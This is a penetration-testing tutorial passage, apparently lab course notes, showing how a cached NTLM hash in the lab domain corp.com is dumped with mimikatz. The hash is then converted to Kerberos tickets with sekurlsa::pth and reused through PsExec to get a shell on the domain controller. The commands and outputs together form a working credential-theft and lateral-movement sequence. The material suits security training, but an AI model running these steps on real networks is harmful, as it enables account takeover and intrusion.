With _overpass the hash_, we can "over" abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user.

To demonstrate this, let's assume we have compromised a workstation (or server) that the Jeff_Admin user has authenticated to, and that machine is now caching their credentials (and therefore their NTLM password hash).

To simulate this cached credential, we will log in to the Windows 10 machine as the Offsec user and run a process as Jeff_Admin, which prompts authentication.

The simplest way to do this is to right-click the Notepad icon on the taskbar, and shift-right click the Notepad icon on the popup, yielding the options in Figure 5.

![[Pasted image 20221114124239.png]]

From here, we can select 'Run as different user' and enter "jeff_admin" as the username along with the associated password, which will launch Notepad in the context of that user. After successful authentication, Jeff_Admin's credentials will be cached on this machine.

We can validate this with the sekurlsa::logonpasswords command from mimikatz, which dumps the cached password hashes.

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 2815531 (00000000:002af62b)
Session           : Interactive from 0
User Name         : jeff_admin
Domain            : CORP
Logon Server      : DC01
Logon Time        : 12/02/2018 09.18.57
SID               : S-1-5-21-1602875587-2787523311-2599479668-1105
        msv :
         [00000003] Primary
         \* Username : jeff_admin
         \* Domain   : CORP
         \* NTLM     : e2b475c11da2a0748290d87aa966c327
         \* SHA1     : 8c77f430e4ab8acb10ead387d64011c76400d26e
         \* DPAPI    : 2918ad3d4607728e28ccbd76eab494b9
        tspkg :
        wdigest :
         \* Username : jeff_admin
         \* Domain   : CORP
         \* Password : (null)
        kerberos :
         \* Username : jeff_admin
         \* Domain   : CORP.COM
         \* Password : (null)
...
```

This output shows Jeff_Admin's cached credentials, including the NTLM hash, which we will leverage to overpass the hash.

The essence of the overpass the hash technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication. A simple way to do this is again with the sekurlsa::pth command from Mimikatz.

The command requires a few arguments and creates a new PowerShell process in the context of the Jeff_Admin user. This new PowerShell prompt will allow us to obtain Kerberos tickets without performing NTLM authentication over the network, making this attack different than a traditional pass-the-hash.

As the first argument, we specify /user: and /domain:, setting them to jeff_admin and corp.com respectively. We'll specify the NTLM hash with /ntlm: and finally use /run: to specify the process to create (in this case PowerShell).

```
mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
user    : jeff_admin
domain  : corp.com
program : cmd.exe
impers. : no
NTLM    : e2b475c11da2a0748290d87aa966c327
  |  PID  4832
  |  TID  2268
  |  LSA Process is now R/W
  |  LUID 0 ; 1197687 (00000000:00124677)
  \_ msv1_0   - data copy @ 040E5614 : OK !
  \_ kerberos - data copy @ 040E5438
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace -> null
```

At this point, we have a new PowerShell session that allows us to execute commands as Jeff_Admin.

Let's list the cached Kerberos tickets with klist:

```
PS C:\Windows\system32> klist

Current LogonId is 0:0x1583ae

Cached Tickets: (0)
```

No Kerberos tickets have been cached, but this is expected since Jeff_Admin has not performed an interactive login. However, let's generate a TGT by authenticating to a network share on the domain controller with net use:

```
PS C:\Windows\system32> net use \\dc01
The command completed successfully.

PS C:\Windows\system32> klist

Current LogonId is 0:0x1583ae

Cached Tickets: (3)

#0> Client: jeff_admin @ CORP.COM
    Server: krbtgt/CORP.COM @ CORP.COM
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canoni
    Start Time: 2/12/2018 13:59:40 (local)
    End Time:   2/12/2018 23:59:40 (local)
    Renew Time: 2/19/2018 13:59:40 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0x2 -> DELEGATION
    Kdc Called: DC01.corp.com

#1> Client: jeff_admin @ CORP.COM
    Server: krbtgt/CORP.COM @ CORP.COM
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonica
    Start Time: 2/12/2018 13:59:40 (local)
    End Time:   2/12/2018 23:59:40 (local)
    Renew Time: 2/19/2018 13:59:40 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0x1 -> PRIMARY
    Kdc Called: DC01.corp.com

#2> Client: jeff_admin @ CORP.COM
    Server: cifs/dc01 @ CORP.COM
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_c
    Start Time: 2/12/2018 13:59:40 (local)
    End Time:   2/12/2018 23:59:40 (local)
    Renew Time: 2/19/2018 13:59:40 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0
    Kdc Called: DC01.corp.com
```

The output indicates that the net use command was successful. We then use the klist command to list the newly requested Kerberos tickets, these include a TGT and a TGS for the _CIFS_ service.

We used "net use" arbitrarily in this example but we could have used any command that requires domain permissions and would subsequently create a TGS.

We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM) such as the official PsExec application from Microsoft.

PsExec can run a command remotely but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of Jeff_Admin in the PowerShell session, we may reuse the TGT to obtain code execution on the domain controller.

Let's try that now, running [./PsExec.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) to launch cmd.exe remotely on the \\dc01 machine as Jeff_Admin:

```
PS C:\Tools\active_directory> .\PsExec.exe \\dc01 cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Windows\system32> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::7959:aaad:eec:3969%2
   IPv4 Address. . . . . . . . . . . : 192.168.1.110
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1
...

C:\Windows\system32> whoami
corp\jeff_admin
```

As evidenced by the output, we have successfully reused the Kerberos TGT to launch a command shell on the domain controller.

Excellent! We have succeeded in upgrading a cached NTLM password hash to a Kerberos TGT and leveraged that to gain remote code execution.